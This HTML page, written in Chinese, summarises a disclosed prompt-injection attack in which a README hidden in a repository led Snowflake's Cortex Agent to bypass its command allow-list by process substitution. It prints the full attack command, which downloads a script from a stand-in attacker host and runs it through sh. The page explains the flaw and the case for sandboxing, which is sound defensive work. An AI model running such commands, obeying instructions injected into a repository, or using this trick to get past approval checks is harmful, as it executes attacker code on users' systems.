@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snowflake Cortex AI 沙箱逃逸 - 安全漏洞</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; line-height: 1.6; max-width: 800px; margin: 0 auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1 { color: #333; border-bottom: 3px solid #dc3545; padding-bottom: 10px; }
+        h2 { color: #555; margin-top: 30px; }
+        .meta { color: #888; font-size: 14px; margin-bottom: 20px; }
+        .warning { background: #f8d7da; padding: 15px; border-left: 4px solid #dc3545; margin: 20px 0; }
+        .tech { background: #e7f3ff; padding: 15px; border-left: 4px solid #0d6efd; margin: 20px 0; }
+        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
+        pre { background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 6px; overflow-x: auto; }
+        .stars { color: #ffc107; }
+        a { color: #dc3545; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚠️ Snowflake Cortex AI 沙箱逃逸漏洞</h1>
+        <div class="meta">来源: Simon Willison's Weblog (via PromptArmor) | 评分: <span class="stars">⭐⭐⭐⭐</span> (4星) | 日期: 2026-03-18</div>
+        
+        <h2>事件概述</h2>
+        <p>PromptArmor 报告了 Snowflake 的 <a href="https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents">Cortex Agent</a> 中的一个prompt injection攻击链，该漏洞已被修复。</p>
+        
+        <div class="warning">
+            <strong>🔴 严重性：</strong> 这是一个真实的安全漏洞，攻击者可以利用 AI 助手执行恶意代码。
+        </div>
+        
+        <h2>攻击链分析</h2>
+        
+        <div class="tech">
+            <strong>攻击步骤：</strong>
+            <ol>
+                <li>用户要求 Cortex Agent 审查一个 GitHub 仓库</li>
+                <li>该仓库的 README 底部隐藏了 prompt injection 攻击</li>
+                <li>攻击导致 Agent 执行了以下代码：</li>
+            </ol>
+        </div>
+        
+        <pre><code>cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))</code></pre>
+        
+        <h2>漏洞根源</h2>
+        <p>Cortex 将 cat 命令列为可以无需人工批准即可安全运行的命令，但没有保护这种形式的<strong>进程替换（process substitution）</strong>——它可能出现在命令主体中。</p>
+        
+        <h2>Simon 的安全观点</h2>
+        <div class="warning">
+            <strong>核心观点：</strong> 我见过很多不同代理工具对命令模式进行白名单过滤，但我完全不信任它们——我觉得它们天生就不可靠。
+        </div>
+        
+        <p>Simon 更愿意将代理命令视为可以执行进程本身允许的任何操作，因此他对在代理层之外运行的确定性沙箱感兴趣。</p>
+        
+        <h2>安全启示</h2>
+        <ul>
+            <li><strong>Allow-lists 不可靠：</strong> 基于命令模式的白名单过滤本质上是不稳定的</li>
+            <li><strong>进程替换风险：</strong> <code>&lt;()</code> 语法可以在看似安全的命令中执行任意代码</li>
+            <li><strong>深度防御：</strong> 需要在代理层之外建立独立的安全边界</li>
+            <li><strong>最小权限原则：</strong> 即使是"安全"的命令也可能被组合利用</li>
+        </ul>
+        
+        <h2>相关链接</h2>
+        <ul>
+            <li><a href="https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware">原始报告 (PromptArmor)</a></li>
+            <li><a href="https://news.ycombinator.com/item?id=47427017">Hacker News 讨论</a></li>
+        </ul>
+        
+        <hr>
+        <p><a href="https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/">原文链接</a></p>
+    </div>
+</body>
+</html>
